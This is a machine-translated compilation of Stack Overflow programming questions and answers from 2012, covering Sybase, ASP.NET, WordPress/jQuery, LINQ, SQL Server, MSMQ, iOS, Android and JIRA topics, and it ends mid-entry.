我对 Sybase 存储过程的语法不是很熟悉。我收到字符串连接错误：

```
create procedure calendarList
as
declare @city varchar(20)
declare @aus varchar(20)
declare @combined varchar(200)
declare @result varchar(200)

declare curs cursor for select distinct M_CTN from UnionCal for read only

open curs

fetch curs into @city

while (@@sqlstatus!=2)
begin
    declare curs2 cursor for
    select * from UnionCal where M_CTN=@city for read only  

    open curs2
    fetch curs2 into @aus

    while (@@sqlstatus!=2)
    begin
        @combined = @combined + ";" + @aus
        fetch curs2 into @aus
    end

    fetch curs into @city

    select @city,@aus 
    close curs2

end 

close curs

return 
```

错误在这一行：

```
@combined = @combined + ";" + @aus 
```

错误消息不是很有帮助：

消息 102，级别 15，状态 1 服务器“DS_LN_D01_X0427”，过程“日历列表”，第 24 行“@combined”附近的语法不正确。

显然我没有以正确的方式连接字符串。有任何想法吗？

我正在使用 Sybase 12。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T16:27:24.337

只需在该命令之前添加`SELECT`or就非常简单：`SET`

```
SELECT @combined = @combined + ";" + @aus 
```

或者

```
SET @combined = @combined + ";" + @aus 
```

# c# - 防止回发 vb 和 javascript

> ID：11052473
> 
> 赞同：0
> 
> 时间：2012-06-15T14:19:00.550
> 
> 标签：c#, javascript, asp.net, .net, vb.net

这是一个回发问题（我不想使用客户端来解决这个问题，必须有一种方法来防止回发然后使用客户端），我有一个按钮，点击它会调用一个javascript函数后面的代码，但在此之前它回发页面，问题是：我如何跳过回发步骤并跳转到 javascript 部分？

```
<script type="text/javascript">
    function hello(name) {
        alert("hello world from javascript " + name)
        return false;
    }
</script>
 </head>
 <body>
<form id="form1" runat="server">
<div>
    <asp:Button ID="Button1" runat="server" Text="Button" />
</div>
</form> 
```

后面的代码：

```
 Protected Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) Handles Button1.Click
    Dim Myname As String = "myName"
    Dim cstype As Type = Me.GetType()
    Page.ClientScript.RegisterStartupScript(cstype, "MyKey", "hello('" & Myname & "');", True)

End Sub 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:30:27.330

使用客户端处理程序而不是服务器端处理程序。删除`Button1_Click`并添加您的 js 调用作为`OnClientClick`属性值。

```
<asp:Button ID="Button1" runat="server" Text="Button" 
            OnClientClick="return hello('myName');" /> 
```

或者，根本不使用服务器控件：

```
<button id="button1" onclick="return hello('myName');">Button</button> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:25:20.307

为什么不使用 HTML 按钮而不是 ASP 按钮

```
<input id="Button1" type="button" value="button" runat="server" /> 
```

和服务器端写类似

```
Button1.Attributes.Add("onclick","hello()"); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:33:34.653

我认为您正在寻找使用`OnClientClick`按钮的事件：

```
<asp:Button ID="Button1" OnClientClick="return hello('world')" runat="server" Text="Button" /> 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T14:20:11.347

1.  您应该在按钮单击事件之前在 page_load 或方法中注册此脚本。

    Button1.Attributes.Add("onclick","re​​turn hello()");

2.  在调用 hello 方法之前使用 return 在后面的代码中注册脚本，如下所示

    Page.ClientScript.RegisterStartupScript(cstype, "MyKey", "return hello('" & Myname & "');", True)

3.  如果您不想回发，请从 Button1_Click 中删除所有语句。或者解绑服务端点击事件

    Protected Sub Button1_Click(ByVal sender As Object, ByVal e As EventArgs) 处理 Button1.Click

结束子

# php - 如何将多个 PHP 变量传递给 jQuery 函数？

> ID：11052474
> 
> 赞同：1
> 
> 时间：2012-06-15T14:19:03.653
> 
> 标签：php, jquery, ajax, wordpress, plugins

我正在开发一个 Wordpress 插件。我需要将插件目录（可以根据个人的安装而改变）传递给 jquery 函数。

这样做的最佳方法是什么？我可以使用的插件版本已包含 PHP 文件中的所有 javascript，因此这些函数与其余内容一起被解析，然后在浏览器中呈现。

我正在研究 AJAX，但我认为它可能比我需要的更复杂。在这种情况下，我可以只使用两个变量（目录，用户没有设置）。

当我阅读了它的良好做法时，我试图将 js 和 php 分开。插件初始化时，调用js文件：

```
 //Wordpress calls the .js when the plugin loads
    wp_enqueue_script( 'wp-backitup-funtions', plugin_dir_url( __FILE__ ) . 'js/wp-backitup.js', array( 'jquery' ) ); 
```

然后我在 .js 文件中，需要弄清楚如何生成以下变量：

```
 dir = '<?php echo content_url() ."/plugins"; ?>';
    dir = '<?php echo content_url() ."/themes"; ?>';
    dir = '<?php echo content_url() ."/uploads"; ?>'; 
```

并运行解析以下请求：

```
 xmlhttp.open("POST","<?php echo plugins_url() .'/wp-backitup/includes/wp-backitup-restore.php'); ?>",true);
    xmlhttp.open("POST","<?php echo plugins_url() .'/wp-backitup/includes/wp-backitup-start.php'); ?>",true);
    xmlhttp.open("POST","<?php echo plugins_url() .'/wp-backitup/wp-backitup-directory.php'); ?>",true);
    xmlhttp.open("POST","<?php echo plugins_url() .'/wp-backitup/wp-backitup-db.php'); ?>",true);
    window.location = "<?php echo plugins_url() .'/wp-backitup/backitup-project.zip'); ?>"; 
    xmlhttp.open("POST","<?php echo plugins_url() .'/wp-backitup/wp-backitup-delete.php'); ?>",true); 
```

内容 URL 和插件 URL 仅在 /plugins/ 上有所不同，所以如果我很难按，我真的只需要发出一个 PHP 请求，然后将其带入 JS。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:24:25.987

没有看到代码有点难，但一般来说，我会在 php 的某个地方输出目录，例如：

```
<script type="text/javascript">
  var dirs = <?php echo empty($dirs) ? "{}" : json_encode($dirs); ?>;
</script> 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:23:23.560

您的函数可以加载到 .js 文件中，但您需要的 PHP 变量可以在您在 PHP 页面中初始化插件时给出。例如：

```
$("#myDiv").startPlugin("<?php echo $directory;?>"); 
```

如果您需要来自 php 的信息，您实际上没有选择将其提供给某个地方的插件。对我来说，用 ajax 查询它不是一个好主意。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:26:46.227

又快又脏：

```
<script type="text/javascript">
<?php
    echo 'var myJsObject =' . json_encode(array(
        'dir1' => $directory1,
        'dir2' => $directory2
    ));
?>
    alert(myJsObject.dir1);
</script> 
```

# c# - 使用 Linq to SQL 是否可以检索两个值并将它们相减？

> ID：11052477
> 
> 赞同：2
> 
> 时间：2012-06-15T14:19:08.553
> 
> 标签：c#, linq, linq-to-sql, select

我正在使用 Linq to SQL 填充一个类。

我想要做的是查询我的数据库，返回两个整数值并将这两个值相减，产生结果，但我想不出一个聪明的方法来做到这一点。

在这种情况下我能做什么？

如果不清楚，那么这个伪代码实现应该阐明我想要什么功能：

```
DECLARE @currentVal INT, @previousVal INT
@currentVal = SELECT VALUE
FROM Table1
WHERE Date = CURRDATE()

@previousVal = SELECT VALUE
FROM Table1
WHERE Date = MIN(Date)

RETURN @currentVal - @previousVal 
```

但是在 Linq to SQL 中`(from o in context.Table1 where Date = currentDate select Value)`，如何从中减去其他值？这可能吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:34:44.767

我坚持将其作为一组中断的查询，因为您可以测试这些值是否实际返回并处理返回太多值的情况：

```
var currentValResults = (from row in rows 
                         where row.Date == DateTime.Now 
                         select row.Value)
                        .ToArray();

var previousValResults = (from row in rows 
                          let minDate = rows.Min(r => r.Date)
                          where row.Date == minDate 
                          select row.Value)
                         .ToArray();

if (currentValResults.Length == 1 && previousValResults.Length == 1)
{
    var diff = currentValResults[0] - previousValResults[0];
}
else
{
    // Error condition?
} 
```

将它全部放入一个巨大的 linq 语句中会产生太多假设（或者至少，我的实现是这样的）。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-15T14:31:24.203

像这样的东西可以让它进入一次数据库之旅（请记住，这假设只会返回两个结果）：

```
int[] values = (from o in context.Table1 
    where Date = currentDate || Date = context.Table1.Min(x => x.Date)
    order by Date descending
    select value).ToArray();

return values[0] - values[1]; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-15T20:19:58.643

```
var currentVal = context.Table1.FirstOrDefault(t=>t.Date == DateTime.Now.Date);
var previousVal = context.Table1.FirstOrDefault(t=>t.Date == context.Table1.Min(d=>d.Date));

var result = currentVal - previousVal; 
```

或者

```
from d in context.Table1
let prevVal = context.Table1.FirstOrDefault(t=>t.Date == context.Table1.Min(d=>d.Date));
where d.Date == DateTime.Now.Date
return new { d - prevVal }; 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-15T14:48:53.840

为什么不简单地做一个交叉连接

```
var query=
  from a in Table1 where a.Date == DateTime.Now
  from b in Table1 where b.Date == Table1.Min(c=>c.Date)
  select a.Amount - b.Amount;

var result=query.First(); 
```

# google-analytics - 获取分析目标的权限不足 (JAVA API)

> ID：11052479
> 
> 赞同：3
> 
> 时间：2012-06-15T14:19:16.860
> 
> 标签：google-analytics, google-api, google-analytics-api

我通过 Java 谷歌分析 API 检索个人资料目标时有一种奇怪的行为。

问题随机发生。有时，当我打电话

```
analytics.management().goals().list(accountId, webpropertyId, profileId).execute(); 
```

它返回

```
{

"code" : 403,

  "errors" : [ {

    "domain" : "global",

    "message" : "User does not have permission to perform this operation",

    "reason" : "insufficientPermissions"

  } ],

  "message" : "User does not have permission to perform this operation"

} 
```

如果我等待几秒钟并重复相同的指令，它工作正常。该问题并非每次都发生（对于权限问题来说非常奇怪）。它在随机配置文件上随机发生

谁能帮我？

# sql - 使用 SQL 查找最大信息

> ID：11052485
> 
> 赞同：3
> 
> 时间：2012-06-15T14:19:41.250
> 
> 标签：sql, sql-server-2008

我在sql server 2008R2 db中有一个具有以下结构的表X（有> 500k记录）：

![表十](../Images/b158270569381c43bf0b6e991d47911b.png)

很容易找到每个 UserAccountKey 的最大 mx ：

```
SELECT 
UserAccountKey
, MAX(mx) mx2
FROM X
GROUP BY UserAccountKey 
```

但是我想修改上面的内容，以便在最大值发生时它还具有记录的 SessionId 和 GamingServerId。

这是[SQL Fiddle](http://sqlfiddle.com/#!3/a9e0a/1)中的工作台。我追求的结果如下

![在此处输入图像描述](../Images/7bf1567d80b920ce6f785da99f5491ed.png)

`JOIN`如果可以避免，我宁愿不必在 mx 上；所以我认为循环是唯一的方法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T14:26:44.927

您还可以使用排名查询：

```
select 
  UserAccountKey
  , SessionId
  , GamingServerId
  , mx
from (

SELECT
    rank() over (partition by UserAccountKey
                 order by mx desc) as rank
    , UserAccountKey
    , SessionId
    , GamingServerId
    , mx
FROM X )data
where rank = 1 
```

这基本上将按 UserAccountkey 对所有内容进行分组，然后按 mx desc 对其进行排序。然后它只是选择所有被赋予等级 1 的问题（该 UserAccountKey 的 mx 的最高值）。

[我的小提琴结果](http://sqlfiddle.com/#!3/a9e0a/7)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-06-15T14:26:52.547

您可以使用[`CTE`](http://msdn.microsoft.com/en-us/library/ms190766%28v=sql.105%29.aspx)带有[`ROW_NUMBER`](http://msdn.microsoft.com/en-us/library/ms186734.aspx)窗口功能的：

```
WITH cte AS(
    SELECT 
        RN=ROW_NUMBER()OVER(PARTITION BY UserAccountKey ORDER BY mx DESC),
        UserAccountKey,
        SessionId, 
        GamingServerId,
        mx
    FROM X
)
SELECT  
    UserAccountKey,
    SessionId,
    GamingServerId,
    mx
FROM cte
WHERE RN = 1 
```

这是你的小提琴：[http ://sqlfiddle.com/#!3/a9e0a/13](http://sqlfiddle.com/#!3/a9e0a/13)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-06-15T14:29:09.347

您需要首先获取最大记录，然后使用它来获取其他字段。请注意，如果您对同一个 UserAccountKey 有两次相同的最大值，您将获得该键的两条记录。

```
select UserAccountKey, 
       SessionId, 
       GamingServerId, 
       mx
from x x1
where mx in
(SELECT MAX(mx) mx2
 FROM X x2
 WHERE x1.UserAccountKey = x2.UserAccountKey) 
```

[SQL小提琴](http://sqlfiddle.com/#!3/a9e0a/20)

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-06-15T14:29:29.823

我认为这应该有效

```
SELECT  UserAccountKey, SessionId, GamingServerId,mx 
FROM (SELECT UserAccountKey, SessionId, GamingServerId,mx, RANK()
      OVER (PARTITION BY UserAccountKey ORDER BY mx DESC) N
      FROM X
)M WHERE N = 1 
```

# .net - 如何有效地检索所有私有 MSMQ 队列的名称？

> ID：11052487
> 
> 赞同：4
> 
> 时间：2012-06-15T14:19:48.187
> 
> 标签：.net, powershell, com, wmi, msmq

如何在不使用的情况下检索本地计算机上所有私有 MSMQ 队列的**名称**`System.Messaging.MessageQueue.GetPrivateQueuesByMachine(".")`？我正在使用 PowerShell，因此任何使用 COM、WMI 或 .NET 的解决方案都是可以接受的，尽管后者更可取。

请注意，[这个问题](https://stackoverflow.com/questions/3329038/msmq-get-all-private-queues)有一个返回所有队列对象的解决方案。*我不想要这些对象（当有很多*队列时它太慢而且有点不稳定），我只想要它们的名字。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T15:30:36.130

```
$obj = Get-WmiObject Win32_PerfRawdata_MSMQ_MSMQQueue ##will return an Object[] array
$obj[0].name ## will return the 1st Queue Name 
```

此外，您可以这样做以了解此对象的更多方法/属性 -

```
$obj | Get-Member 
```

**要仅列出私人 Q，您可以使用 -**

```
Get-WmiObject Win32_PerfRawdata_MSMQ_MSMQQueue |
    ?{$_.Name -match "private"} |
        %{$_.Name} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2015-08-05T17:38:01.497

从 Windows Server 2012 和 Win8 开始，PS 有一个 Get-MsmqQueue 命令。在我的测试中，它比 get-wmiobject 方法快。

```
Measure-Command {
  $list = Get-MsmqQueue -QueueType Private | % {$_.QueueName}
}
Measure-Command {
  $list = Get-WmiObject Win32_PerfRawdata_MSMQ_MSMQQueue | ?{$_.Name -match "private"} | %{$_.Name} 
} 
```

# ios - 可拖动图像ios的边界

> ID：11052490
> 
> 赞同：0
> 
> 时间：2012-06-15T14:19:51.470
> 
> 标签：ios, draggable, uitouch, boundary

我正在尝试创建一个可拖动的图像，但我试图将其拖动到一个小方块内而不是全屏。有人可以告诉我哪里出错了吗？我已将到目前为止的代码放在下面：

```
-(void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event{
    UITouch *touch = [[event allTouches] anyObject];
    if([touch view] == dot) {
        CGPoint location = [touch locationInView:self.view];
        dot.center = location;
        if (location.x >10) {
            location.x =10;
        } else if (location.x <10) {
            location.x = 10;
        }
        if (location.y >20) {
            location.y =20;
        } else if (location.y < 20) {
            location.y = 20;
        }      
    }
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-15T14:54:55.727

`location`您在对其进行更改之前 进行分配。

首先应用您的限制，`location`然后将其分配给`dot`.

此外，您显示的限制会将您的位置锁定为 10,20，因为您不允许它超过 10 或小于 10。同样与 20。

```
-(void)touchesMoved:(NSSet *)touches withEvent:(UIEvent *)event{
    UITouch *touch = [[event allTouches] anyObject];
    if([touch view] == dot) {
        CGPoint location = [touch locationInView:self.view];
        location.x = MIN(MAX(location.x, 0),10);
        location.y = MIN(MAX(location.y, 0),20);
        dot.center = location;     
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-15T14:49:24.577

我最近实现了一个像这样的图像拖动功能。我使用 PAN Gesture 移动图像，生成两个 CGFloats“endPointX 和 endPointY”。在下面的注释“留在屏幕上检查”和“结束留在屏幕上检查”之间的代码中，我检查这些是否在屏幕上。如果不是，我会调整它们以防止图像移出屏幕。

我希望这会有所帮助。如果您想在整个屏幕的一小部分内移动图像，那么我会将图像添加到持有人子视图中，然后改为检查持有人视图 .bounds.size.width/height 上方。

```
CGFloat endPointX = translatedPoint.x + (.35*[(UIPanGestureRecognizer*)sender 
velocityInView:self.view].x);

CGFloat endPointY = translatedPoint.y + (.35*[(UIPanGestureRecognizer*)sender velocityInView:self.view].y);

// Stay on the screen check

if(endPointX < 0) {

    endPointX = 0;

} else if(endPointX > self.view.bounds.size.width) { 

    endPointX = self.view.bounds.size.width;            

}

if(endPointY < 0) {

    endPointY = 0;

} else if(endPointY > self.view.bounds.size.height) {               

    endPointY = self.view.bounds.size.height; 

}

// End of the Stay on Screen check

[UIView beginAnimations:nil context:NULL];

[UIView setAnimationDuration:.35];

[UIView setAnimationCurve:UIViewAnimationCurveEaseOut];

[[sender view] setCenter:CGPointMake(endPointX, endPointY)];

[UIView commitAnimations]; 
```

# .net - Ext JS 4：Sencha Ext JS 框架中的富文本或 HTML 文本编辑器

> ID：11052493
> 
> 赞同：2
> 
> 时间：2012-06-15T14:19:57.350
> 
> 标签：.net, extjs, html-editor, rich-text-editor

Ext JS 4 框架是否提供用于富文本（或 HTML）编辑的小部件？如果没有，请告诉我您对提供此功能的任何工具（即：jQuery、YUI 等）的建议。我以前用过 Telerik RadControls 编辑器，但它不是免费的，我正在寻找一个免费的工具。如果可能的话，我想要一个 JavaScript HTML 编辑器。

我的服务器代码是用 .NET 编写的，但我认为这并不重要。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-15T14:28:13.943

他们确实有 HTML 编辑器组件：[http ://docs.sencha.com/ext-js/4-0/#!/api/Ext.form.field.HtmlEditor](http://docs.sencha.com/ext-js/4-0/#!/api/Ext.form.field.HtmlEditor)

# iphone - 将项目加载到设备时出错..关于 libsqlite3.0dylib 文件丢失

> ID：11052501
> 
> 赞同：0
> 
> 时间：2012-06-15T14:20:26.100
> 
> 标签：iphone, ios, ios4

我正在开发一个应用程序。在我的项目中间突然 libsqlite3.0dylib 文件变成了红色。当我试图将项目加载到模拟器中时，它正在运行并进入设备时显示滚动错误。

我删除了红色文件并新添加了 libsqlite3.0dylib 文件。然后它也显示错误。我看过更多的论坛，但没有得到正确的选择来继续我的应用程序。

什么可能导致这种情况，我该如何解决？

> ld：警告：忽略文件 /Developer/Platforms/iPhoneOS.platform/DeviceSupport/4.2.1 (8C148)/Symbols/usr/lib/libsqlite3.0.dylib，文件 ld 中缺少所需的体系结构 i386：警告：忽略文件 /Developer /Platforms/iPhoneOS.platform/DeviceSupport/4.2.1 (8C148)/Symbols/usr/lib/libSystem.dylib，文件 ld 中缺少所需的架构 i386：在 /Developer/Platforms/iPhoneOS.platform/DeviceSupport/4.2.1 中（ 8C148)/Symbols/usr/lib/libobjc.A.dylib，在架构 i386 的文件中缺少所需的架构 i386

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:58:31.967

在你`Target`的`Build Settings`，删除所有内容`Framework Search Paths`。这应该可以解决您的问题。

希望这可以帮助 ！

**PS**：这是之前一直存在的问题。您可以在此处查看解决方案，[Build Error - missing required architecture i386 in file](https://stackoverflow.com/questions/1456185/build-error-missing-required-architecture-i386-in-file/1467238#1467238)。

由于您无法理解`how`解决问题，我还将附上一张照片，说明您的`Framework Search Paths`外观。`Empty`.

![在此处输入图像描述](../Images/9fd5e814892c0a536bed98d7e55da818.png)

# xml-rpc - 如何使用 xml-rpc-c 在互联网上传输 jpg

> ID：11052505
> 
> 赞同：0
> 
> 时间：2012-06-15T14:20:34.793
> 
> 标签：xml-rpc

现在情况是这样的：在xml-rpc-c的帮助下，我可以传输char和int，但是现在我想传输一些二进制数据。我使用 char* 记录二进制数据，然后我使用 fomatstring "s#" 或 "6"，它们都无法工作，错误是“4 字节假定 UTF-8 字符串不是有效的 UTF-8。无法识别的 UTF-8 初始字节值 0xffffffff(-510)" 。有谁能够帮我？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-28T17:23:50.127

您可以将其编码为 Base64。根据您的开发堆栈，有很多可用的库。编码成 Base64 的图像会比原始图像大，所以如果确实需要，请使用它。

# c# - 接口分离器

> ID：11052508
> 
> 赞同：0
> 
> 时间：2012-06-15T14:20:40.083
> 
> 标签：c#, mocking, moq

我在这种情况下嘲笑：

```
class A
{
    public IB B {get; set;}
}

interface IB
{
  //methods
}

class B : IB
{
  //IB methods
}

public SimpleMockTest()
{
   var mockIB = new Mock<IB>();
   var a = new A{B=mockIB.Object};
   //do stuff with A, then verify methods on IB were called       
}

public TheKindOfTestIWantToDo()
{
   var actualB = new B();
   var mockIB = new Mock<IB>();
   var splitter = new Splitter<IB>(actualB, mockIB.Object); //I need something like this
   var a = new A{B=splitter};
   //do stuff with A, methods invoked on splitter IB get passed to both supplied instances
   //of IB (actualB, and the mockIB). Allowing me to verify the calls as well as have the methods invoked on the actual B object.
   //OR:
   var mockIB2 = new Mock<IB>(actualB); //behaviour is dictated by the actual, but allows verification
   var a2 = new A{B=mockIB2.Object};
} 
```

所以我追求某种代理工厂，它通常支持一个接口并在多个接口上调用相同的方法。当然，当一个方法返回一个值时，每个方法都需要返回相同的值，或者可能需要先入为主。

我想在测试期间有效地窥探接口调用，但没有模拟是行尾。

如果有任何区别，我正在使用最小起订量。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:36:03.700

据我所知，没有办法对`actualB`.

我想你想要这样的东西：

```
public TheKindOfTestIWantToDo()
{
   var actualB = new B();
   var mockIB = new Mock<IB>();
   mockIB.Setup(b => b.Foo()).Returns(() => actualB.Foo())
   var a = new A { B = mockIB };
   //do stuff with A, methods invoked on splitter IB get passed to both supplied instances
   //of IB (actualB, and the mockIB). Allowing me to verify the calls as well as have the methods invoked on the actual B object.
} 
```

不过，您可能应该重新考虑您的单元测试策略。的行为`A`应该是可测试的，而不依赖于 的行为`B`。尝试`mockIB`返回特定值，然后为`B`.

# android - C:\Program Files\MSBuid\Novell\Novell.MOnoDroid.Csharp.targets 未找到

> ID：11052509
> 
> 赞同：7
> 
> 时间：2012-06-15T14:20:40.183
> 
> 标签：android, xamarin.android

当我从 Visual Studio 2010 创建新的 android 项目时，它会给出以下消息。

C:\Program Files\MSBuid\Novell\Novell.MOnoDroid.Csharp.targets 未找到。确认声明中的路径正确，并且该文件存在于磁盘上。

我如何克服这个错误。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:28:05.387

听起来像一个糟糕的安装，卸载并重新安装，然后再试一次。

# jira - JIRA/GreenHopper：如何允许用户对问题进行排名，但不更改 fixVersion？

> ID：11052512
> 
> 赞同：2
> 
> 时间：2012-06-15T14:20:50.157
> 
> 标签：jira, jira-agile

由于我不会在这里讨论的原因，我需要阻止开发人员更改 JIRA 中的修复版本，而不阻止他们更改 Green Hopper 排名。

这有点复杂，因为 Greenhopper 允许您更改是否使用计划问题或解决问题权限。

我尝试了以下方法：

*   将 GH 设置为使用 Resolve Issues 权限并撤销 Resolve Issues 权限。这可以防止用户更改这两个字段。

*   将 GH 设置为使用 Schedule Issues 权限并撤销 Resolve Issues 权限。这允许编辑排名，并阻止更改 JIRA 屏幕中的修复版本，到目前为止一切都很好。但是，仍然可以在 Green Hopper 规划板上更改修复版本。

*   我还研究了从 JIRA 屏幕中删除 Fix Version 字段，但是您仍然可以随时在 GH 中更改它。

我没有想法，所以我希望有人为我找到答案:)

忘了提 - 我正在使用 JIRA 4.1.2 和 GH 5.1

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-02-07T02:11:12.970

开箱即用，您描述的内容无法完成。Atlassian 已明确表示，他们不会提供[JIRA-1330](https://jira.atlassian.com/browse/JRA-1330)中所述的现场级安全性。

也就是说，对谁可以设置 fixVersion 字段的控制由此处所述的[“解决问题”权限](https://confluence.atlassian.com/pages/viewpage.action?pageId=149834)控制，尽管您似乎已经走这条路了。

我的问题是：您使用的是 fixVersion 字段吗？如果是这样，您如何使用它以及何时设置？答案是找出正确方法的关键。

解决此问题的几种可能方法：

*   [通过本文](https://confluence.atlassian.com/pages/viewpage.action?pageId=149834)中概述的工作流程对其进行控制
*   [如本文](https://confluence.atlassian.com/display/JIRA/Using+Templates+to+control+edit+of+an+issue)所述，通过模板控制它
*   查看[Field Security 插件](https://marketplace.atlassian.com/plugins/com.quisapps.jira.jfs)是否可以满足您的需求

与 JIRA 合作了足够长的时间，我知道我可以拼凑一些东西来实现这一点。这只是需要时间。例如，如果任何人在没有更改权限的情况下编辑了 fixVersion 字段，您也许可以使用脚本插件来重置该字段。

根据这对您的重要性，您可能希望聘请 JIRA 顾问来为您的需求提供解决方案。

# java - android位图大小超出VM预算错误

> ID：11052513
> 
> 赞同：0
> 
> 时间：2012-06-15T14:20:51.503
> 
> 标签：java, android, eclipse

我正在使用以下代码从 url 获取位图。此函数在我的代码中多次使用，并且在第三次或第四次调用崩溃时显示以下错误。Url 存在，我确信以前的调用没有区别。谢谢

```
 public static Bitmap getBitmapFromURL(String src) {
                try {
                    Log.e("src",src);
                    URL url = new URL(src);
                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();
                    connection.setDoInput(true);
                    connection.connect();
                    InputStream input = connection.getInputStream();
                    Bitmap myBitmap = BitmapFactory.decodeStream(input); //crashes at this line
                    Log.e("Bitmap","returned");
                    return myBitmap;
                } catch (IOException e) {
                    e.printStackTrace();
                    Log.e("Exception",e.getMessage());
                    return null;
                }
            }

06-15 14:15:34.365: E/AndroidRuntime(863): FATAL EXCEPTION: main
06-15 14:15:34.365: E/AndroidRuntime(863): java.lang.OutOfMemoryError: bitmap size exceeds VM budget
06-15 14:15:34.365: E/AndroidRuntime(863):  at android.graphics.BitmapFactory.nativeDecodeStream(Native Method)
06-15 14:15:34.365: E/AndroidRuntime(863):  at android.graphics.BitmapFactory.decodeStream(BitmapFactory.java:459)
06-15 14:15:34.365: E/AndroidRuntime(863):  at android.graphics.BitmapFactory.decodeStream(BitmapFactory.java:515)
06-15 14:15:34.365: E/AndroidRuntime(863):  at com.nimbosolutions.projecte1.TabBar_iOSActivity.getBitmapFromURL(TabBar_iOSActivity.java:232)
06-15 14:15:34.365: E/AndroidRuntime(863):  at com.nimbosolutions.projecte1.TabBar_iOSActivity.addTab(TabBar_iOSActivity.java:209) 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-15T14:25:46.557

您说“第三次或第四次”-每次都是相同的位图吗？如果是，为什么不缓存和重用？

如果不是，你真的需要同时在内存中的所有 3-4 个位图吗？如果是，你就被封号了。如果没有，我可以建议您`recycle()`在丢弃它们之前调用您的位图（即在您将引用设为空之前）吗？众所周知，这比普通 GC 更快地释放内存。

# intellij-idea - IntelliJ 中用于 Android xml 文件的自动代码格式化

> ID：11052522
> 
> 赞同：3
> 
> 时间：2012-06-15T14:21:19.567
> 
> 标签：intellij-idea

我刚刚从 Eclipse 切换到 IntelliJ，并注意到当我使用“重新格式化代码”功能时，它不像在 Eclipse 中那样工作，即它在我的 xml 文件中使用不同数量的空格。有没有办法配置它？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-15T14:31:59.200

是的，您可以在 XML 代码样式设置中更改它：

![在此处输入图像描述](../Images/c5e022f8002fd84c4a47ee89c6063c00.png)

# android - Jquery Mobile App不在Android上显示某些图像

> ID：11052523
> 
> 赞同：0
> 
> 时间：2012-06-15T14:21:20.993
> 
> 标签：android, html, css, jquery-mobile, cordova

我有一个完整的 Jquery Mobile 应用程序，当前构建并且在多个浏览器中看起来都很好。我目前正在努力获取使用 phonegap for android 移植的版本。当它在手机上加载时，它有几个根据 localStorage 加载的图像（我最初使用 cookie，但发现一些 android 设备对此不太友好）。现在，几乎所有这些触发器都可以正常加载图像，除了最后一页。某组图像无法加载，并且出现错误（在模拟器中运行时`Unknown chromium error: -6`。页面上的其他人使用相同的进程并且没有问题，并且所有图像都在本地引用。为什么会发生这种情况？我该怎么做才能解决这个问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-06-15T18:06:19.093

结果在android浏览器中，在phonegap下，文件名区分大小写。所以它无法加载大写字母等内容。

# algorithm - 将全局坐标转换为一组局部矩阵以创建 ik 骨架

> ID：11052526
> 
> 赞同：1
> 
> 时间：2012-06-15T14:21:29.113
> 
> 标签：algorithm, matrix, rotation, coordinates, quaternions

我有一组关节随时间移动的 3d 全局位置以及与它们相关的 ik 骨架结构。我目前正在编写一些代码来将此信息转换为 .bvh 文件。我了解 .bvh 结构，但我需要为每一帧将全局坐标转换为一系列局部矩阵，这些矩阵表示每个节点从父节点“移动”到子节点的转换。

我不知道该怎么做是计算转换的局部矩阵，例如从

rootNode = (Rx,Ry,Rz) 并假设初始方向与全局轴一致

至

child1 = (Cx,Cy,Cz)

等等。

非常感谢任何帮助。

# c# - 实体框架 4.1 中的部分保存

> ID：11052527
> 
> 赞同：0
> 
> 时间：2012-06-15T14:21:31.607
> 
> 标签：c#, entity-framework-4.1

我对实体框架很陌生。

我有一组静态数据，其中包括：

与列有多对多关系的模板

我想创建一个新的 UserReport，它具有对现有模板的引用，以及与所述相同模板关联的列的子集。

我希望保存 UserReport 记录，以及将 UserReport 链接到现有列的 UserReportColumns 映射表中的一系列记录。

我的代码如下：

```
 ReportTemplate template = staticData.ReportTemplates.First();
 UserReport newReport = new UserReport()
 {
     ....
     Columns = FilterColumns(template.Columns)
     ....
 }
  ....
  context.UserReports.Attach(userReport);
  context.UserReports.AddObject(userReport);
  context.SaveChanges(); 
```

这会尝试重新创建数据库中对象层次结构中的所有内容。

我怎样才能得到它，以便它只保存 UserReport 和 UserReport_Column 链接？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-15T14:38:07.670

您正在`template`从不同的`DbContext`实例（或某些缓存的数据源）中检索 。因此，`context`假设模板和列是新对象。

要克服这个问题，您必须将现有对象附加到上下文以避免 EF 将它们添加到数据库中。

```
 foreach(var column in newReport.Columns)
  { 
      context,Column.Attach(column);
  }

  context.UserReports.Attach(template);
  context.UserReports.AddObject(userReport);
  context.SaveChanges(); 
```

# html - h2 一直到下一个 div 的顶部

> ID：11052530
